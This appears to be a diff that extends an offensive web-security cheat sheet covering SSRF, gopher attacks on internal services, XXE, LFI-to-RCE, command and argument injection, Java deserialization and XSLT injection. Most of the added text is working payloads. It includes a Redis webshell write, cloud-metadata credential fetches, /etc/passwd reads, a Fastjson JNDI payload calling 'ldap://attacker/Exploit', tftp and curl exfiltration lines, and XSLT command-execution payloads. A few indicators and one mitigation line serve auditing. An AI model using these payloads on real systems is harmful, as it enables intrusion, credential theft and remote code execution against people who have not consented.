@@ -39,8 +39,9 @@
 ### Bypass Techniques
 - DNS rebinding to bypass IP allowlists (TTL=0, dual A records)
 - Cloud metadata endpoints: `169.254.169.254` (AWS/GCP/Azure), `fd00:ec2::254`, `metadata.google.internal`, `100.100.100.200` (Alibaba)
-- Protocol smuggling via `gopher://` (craft arbitrary TCP packets), `dict://`, `file://`, `ftp://`, `tftp://`, `ldap://`, `jar://`
+- Protocol smuggling via `gopher://` (craft arbitrary TCP packets), `dict://`, `file://`, `ftp://`, `tftp://`, `ldap://`, `jar://` — `jar:http://127.0.0.1!/path` bypasses protocol filters that check the `jar:` scheme while the inner URL fetches `http://127.0.0.1`; two-stage fetch: downloads the JAR/ZIP from the inner URL then extracts an entry — Java-specific, works in any Java SSRF sink delegating to `java.net.URL`
 - IP representation bypass: decimal (`2130706433` = `127.0.0.1`), octal (`0177.0.0.1`), hex (`0x7f000001`), IPv6 (`[::1]`, `[::ffff:127.0.0.1]`, `[0:0:0:0:0:ffff:7f00:1]`), mixed notation (`127.1`, `127.0.1`)
+- IPv6 zone identifier bypass: `http://[fe80::1%25eth0]/` — `%25` is URL-encoded `%`, zone ID bypasses naive IPv6 literal strip; `http://[fe80::1%25lo]/` for loopback via zone ID; works against Python `urllib`, Go `net/url`, Node.js `url.parse` — validators strip brackets but don't handle zone identifiers
 - URL parser differentials: Python `urllib` vs `requests`, Node.js `url.parse` vs `new URL()`, Go `net/url`, PHP `parse_url` — each handles authority, scheme, fragment differently
 - Open redirect chaining: SSRF filter blocks internal IPs but follows redirects from allowed hosts
 - SSRF via FFmpeg: HLS playlist fetching (`#EXT-X-MEDIA-SEQUENCE`), `concat` protocol, `subfile` protocol
@@ -52,8 +53,44 @@
 - Partial SSRF: response not returned but side-channels (timing, error messages, DNS) confirm reachability
 - SSRF via HTML-to-PDF: `<link>`, `<img>`, `<script src>`, `@import url()`, `<base href="http://internal">` — all fetch resources server-side
 
+### Gopher Protocol — Internal Service Exploitation
+
+`gopher://` lets SSRF craft arbitrary TCP payloads to unauthenticated internal services. Tool: `gopherus`.
+
+| Service | Technique | Notes |
+|---------|-----------|-------|
+| Redis | `CONFIG SET dir /var/www/html` + `SET key "<?php system($_GET[0])?>"` + `SAVE` | Writes webshell; requires writable webroot |
+| Redis | `CONFIG SET dbfilename shell.php` + cron-based reverse shell | Alternative write target |
+| FastCGI | Gopherus generates FCGI payload with `PHP_VALUE` + known PHP file path | Requires knowing an existing `.php` path on disk |
+| MySQL | Unauthenticated query execution against MySQL without password | Pre-auth only if `skip-grant-tables` or blank root password |
+| SMTP | Inject `RCPT TO`, `DATA` — send phishing email from internal relay | Bypass SPF if relay is trusted |
+| Memcached | Inject serialized value into cache key consumed by app | Cache poisoning / deserialization chain |
+
+**Alternative schemes for port probing / service abuse:**
+- `dict://internal:6379/INFO` — Redis banner grab (one-shot command)
+- `sftp://attacker/` — triggers SSH client connection (credential leak potential)
+- `ldap://` / `ldaps://` — JNDI-style lookup trigger in Java apps
+- `tftp://attacker/payload` — blind UDP exfil on restricted networks
+
 ### Internal Service Targets
 - Redis (write webshell via `CONFIG SET`), Memcached (inject serialized data), Elasticsearch, Docker API (`/containers/json`, `/exec`), Kubernetes API (`/api/v1/`), Consul, etcd, Zookeeper
+
+### SSRF via PDF / Headless Browser
+
+HTML-to-PDF engines and headless browsers render user-controlled HTML server-side — all resource fetches originate from the server.
+
+| Engine | SSRF / LFI Vector |
+|--------|-------------------|
+| wkhtmltopdf | `<img src="http://169.254.169.254/latest/meta-data/">` — cloud metadata; `<iframe src="file:///etc/passwd">` — local file read |
+| PD4ML, Prince, WeasyPrint | Same `<img>`/`<iframe>` vectors; also `@import url("http://internal:8080/")` for port scanning |
+| Puppeteer / headless Chrome | `<script>fetch("http://internal/...")</script>` with response reflected in DOM; `window.location` redirect |
+| Any engine | `<link rel="stylesheet" href="http://internal:6379/">` — port probe via CSS fetch (timing/error side-channel) |
+| FFmpeg / media processors | HLS playlist `#EXT-X-MEDIA-SEQUENCE` to trigger URL fetches; `concat://` protocol; `subfile` protocol for partial file read |
+
+Key payloads:
+- Cloud metadata: `<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` (AWS), `http://metadata.google.internal/computeMetadata/v1/` (GCP — needs `Metadata-Flavor: Google` header, may be bypassed via redirect)
+- Local file: `<iframe src="file:///etc/passwd" width="100%" height="500">` — content rendered into PDF
+- Internal port scan: embed many `<img>` tags with different internal ports; render time differences reveal open ports
 
 ---
 
@@ -78,10 +115,11 @@
 
 ### Advanced Techniques
 - Billion laughs DoS (entity expansion bomb): `<!ENTITY a "&b;&b;&b;">` nested 10+ levels
-- XInclude injection: `<xi:include parse="text" href="file:///etc/passwd"/>` when you can't control DOCTYPE
+- XInclude injection: `<xi:include parse="text" href="file:///etc/passwd"/>` when you can't control DOCTYPE; full element: `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`
 - SVG XXE: `<svg xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></svg>`
 - Local DTD file inclusion for data exfiltration (use known DTD files on the system to redefine entities)
-- XXE via content-type switch: change `Content-Type: application/json` to `application/xml` — some frameworks auto-parse
+- XXE via content-type switch: change `Content-Type: application/json` to `application/xml` — many frameworks auto-parse, enabling XXE on endpoints that appear JSON-only
+- **UTF-16 WAF bypass:** convert entire XML payload to UTF-16 with `iconv -f UTF-8 -t UTF-16BE payload.xml > payload16.xml` and add `<?xml version="1.0" encoding="UTF-16"?>` declaration — XML parsers must handle UTF-16 per spec, but WAF pattern matchers keyed on ASCII byte sequences (`<!DOCTYPE`, `ENTITY`, `SYSTEM`) typically don't; submit with `Content-Type: application/xml`
 
 ---
 
@@ -123,21 +161,21 @@
 - `php://memory`, `php://temp` for in-memory streams
 
 **php://filter chain RCE (no file write needed):**
-- Chain `convert.iconv` filters to generate arbitrary PHP code character by character
-- Works on any LFI with `include()` even when `allow_url_include` is off
-- Tool: `php_filter_chain_generator.py`
+- Chain `convert.iconv.*` filters to generate arbitrary PHP code byte-by-byte
+- Works on any LFI with `include()` even when `allow_url_include` is off and no writable path exists
+- Tool: `synacktiv/php_filter_chain_generator`, `ambionics/wrapwrap`
 
-**LFI to RCE escalation:**
-- Include `/proc/self/environ` (User-Agent injection)
-- Include `/var/log/apache2/access.log` or `/var/log/nginx/access.log` (log poisoning)
+**LFI to RCE escalation paths:**
+- Include `/proc/self/environ` (poison via User-Agent header)
+- Include `/var/log/apache2/access.log` or `/var/log/nginx/access.log` (log poisoning — insert `<?php ... ?>` in User-Agent/path)
 - Include uploaded files (race condition or known temp path)
-- Include session files (`/tmp/sess_SESSIONID`)
-- Include `/proc/self/fd/N` (leaked file descriptors)
-- PHP session upload progress (`session.upload_progress`)
-- PEAR `pearcmd.php` trick (`?+config-create+/&file=/usr/share/php/pearcmd.php`)
-- Nginx temp file buffering (large body → temp file → include via `/proc/PID/fd/N`)
-- phpinfo() + LFI race condition: phpinfo leaks temp file path, race to include it before cleanup
-- `/var/lib/php/sessions/` alternative session path
+- Include session files (`/tmp/sess_SESSIONID` or `/var/lib/php/sessions/sess_SESSIONID`)
+- Include `/proc/self/fd/N` (leaked open file descriptors)
+- PHP session upload progress (`session.upload_progress`) race
+- PEAR `pearcmd.php` trick (`?+config-create+/&file=/usr/share/php/pearcmd.php&/<?=phpinfo()?>+/tmp/x.php`)
+- Nginx temp file race: large body buffered to `/var/lib/nginx/body/`, race via `/proc/PID/fd/N`
+- phpinfo() + LFI race: phpinfo leaks temp file path before PHP cleanup
+- `.user.ini` with `auto_prepend_file=shell.jpg` (no .htaccess needed, works in any PHP-executing dir)
 
 #### Open_basedir Bypass
 - `glob://` wrapper (list files outside basedir)
@@ -204,6 +242,30 @@
 
 **Chaining operators:** `;`, `|`, `||`, `&&`, `\n` (`%0a`), `\r\n` (`%0d%0a`), `` ` `` (backtick substitution), `$()` (command substitution), `>(command)` (process substitution)
 
+**WorstFit — Unicode width bypass (Windows/PHP, 2024):**
+- Fullwidth Unicode characters (e.g., `Ａ` = U+FF21, `｜` = U+FF5C) bypass `escapeshellarg()` / `escapeshellcmd()` on PHP for Windows
+- Windows code page conversion (UTF-8 → ANSI/OEM) strips the fullwidth prefix byte, collapsing the character to its ASCII equivalent shell metacharacter (`|`, `&`, `>`, etc.)
+- Linux is unaffected; exploit requires PHP on Windows with a non-UTF-8 system code page
+
+### Argument Injection (No Shell)
+
+When `execFile`/`spawn` (no shell) is used, user input becomes an argv element — no shell metacharacters needed:
+
+| Binary | Dangerous Flag | Impact |
+|--------|---------------|--------|
+| `curl` | `-o /tmp/shell.php` | Write arbitrary file |
+| `curl` | `-d @/etc/passwd` | Exfiltrate file contents |
+| `git` | `--upload-pack=evil` | RCE via custom pack handler |
+| `git` | `--config=core.sshCommand=CMD` | RCE via SSH |
+| `tar` | `--checkpoint-action=exec=CMD` | RCE during extraction |
+| `rsync` | `-e CMD` | RCE via remote shell |
+| `find` | `-exec CMD ;` | RCE via find |
+| `ssh` | `-o ProxyCommand=CMD` | RCE via proxy |
+| `zip`/`7z` | `-T -TT CMD` | RCE via test command |
+| `wget` | `-O /tmp/shell.php` | Write arbitrary file |
+
+Mitigation: always use `--` separator before user input to terminate flag parsing.
+
 ---
 
 ## Deserialization
@@ -265,9 +327,9 @@
 |---------|------|------------|
 | jackson-databind | `ObjectMapper.readValue()` with `enableDefaultTyping()` | Multiple CVE blacklist bypasses |
 | Fastjson 1.2.24 | `JSON.parseObject()` — `JdbcRowSetImpl` JNDI | autoType on by default |
-| Fastjson 1.2.25-41 | `L...;` class name wrapping bypass | |
-| Fastjson 1.2.42 | double `LL...;;` bypass | |
-| Fastjson 1.2.47 | `java.lang.Class` cache poisoning | No autoType needed |
+| Fastjson 1.2.25-41 | `L...;` class name wrapping bypass | autoType blocklist introduced but bypassable |
+| Fastjson 1.2.42 | double `LL...;;` wrapping bypass | |
+| Fastjson 1.2.47 | `java.lang.Class` cache poisoning | No autoType needed — works with autoType disabled |
 | XStream | `XStream.fromXML()` | Multiple CVEs |
 | SnakeYAML | `Yaml.load()` | RCE via `ScriptEngineManager` |
 | json-io | `JsonReader.jsonToJava()` | Memory corruption on Android |
@@ -297,6 +359,28 @@
 | SAP Hybris | CVE-2019-0344 | virtualjdbc |
 | MySQL Connector/J | CVE-2017-3523 | autoDeserialize mode |
 | Neo4j | CVE-2021-34371 | RMI shell server |
+
+### Fastjson — Version Bypass Chain
+
+Fastjson is the dominant JSON library in Chinese-stack Java apps (Alibaba ecosystem, Spring Boot services); version fingerprinting is critical before choosing a payload.
+
+| Version | Bypass | Payload Shape |
+|---------|--------|---------------|
+| ≤ 1.2.24 | `JdbcRowSetImpl` JNDI — `autoType` on by default | `{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}` |
+| 1.2.25–1.2.41 | `L...;` class name wrapping | `{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;", ...}` |
+| 1.2.42 | Double `LL...;;` wrapping | `{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;", ...}` |
+| 1.2.47 | `java.lang.Class` cache poisoning | Works even with `autoType=false`; poison class cache then load target type |
+
+Detection: look for `@type` key in JSON body. Fingerprint via error message differences for each version range.
+
+### Java RMI
+
+- Default port: **1099** (RMI registry); also 1098 (activation), arbitrary ephemeral ports for remote objects
+- Unauthenticated registry enumeration: `rmg enum <host> <port>` lists bound names, server version, security manager status
+- Tool: `remote-method-guesser` (rmg) — brute-force method signatures, call methods with ysoserial gadget payloads
+- Exploit path: `rmg call <host> <port> <gadget>` triggers `readObject()` on the server when deserializing method arguments
+- Class loading: if `useCodebaseOnly=false` (Java < 8u121 default), server loads classes from attacker-controlled `java.rmi.server.codebase` URL
+- **GWT-RPC:** requests starting with `//GWT-RPC//` use Java native serialization for method arguments — same ysoserial gadget chains apply; sink is `AbstractRemoteServiceServlet.readContent()`
 
 ### Detection Signatures
 
@@ -349,3 +433,39 @@ state: !!python/tuple
 - Default DES key: `NzY1NDMyMTA=`
 - Default AES CBC key: `MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz`
 - Server-side indicator: `value="-XXX:-XXXX"`
+
+---
+
+## XSLT Injection
+
+User-controlled XSLT stylesheets or XSL parameters evaluated by the server's XSLT processor.
+
+### Source Audit Targets
+- XSLT transformation endpoints accepting a stylesheet URL or inline XSL
+- XML document + XSL template where either is user-supplied
+- Report/invoice generation pipelines using XSL-FO
+
+### RCE by Runtime
+
+| Runtime | Namespace / Function | Payload |
+|---------|---------------------|---------|
+| PHP (XSLTProcessor) | `xmlns:php="http://php.net/xslt"` | `<xsl:value-of select="php:function('assert', 'system(\"id\")')"/>` |
+| Java (Xalan) | `xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"` | `<xsl:variable name="rtObj" select="rt:getRuntime()"/><xsl:variable name="process" select="rt:exec($rtObj,'id')"/>` |
+| .NET (MSXML / System.Xml) | `<msxsl:script language="C#" implements-prefix="user">` | Embed `System.Diagnostics.Process.Start("cmd","/c whoami")` in script block |
+
+### SSRF via `document()` Function
+```xml
+<xsl:value-of select="document('http://internal:8080/admin')"/>
+```
+Fetches any URL server-side during transformation — full SSRF including internal metadata endpoints.
+
+### File Read
+```xml
+<xsl:copy-of select="document('file:///etc/passwd')"/>
+```
+Reads local files into the transformation output (requires `document()` not disabled by processor config).
+
+### Key Indicators
+- Response contains XML/XSLT error traces referencing `javax.xml.transform`, `Xalan`, `libxslt`, `System.Xml.Xsl`
+- Endpoint accepts `stylesheet`, `xsl`, `transform`, `template` parameters
+- API that converts XML → HTML/PDF server-side using XSL
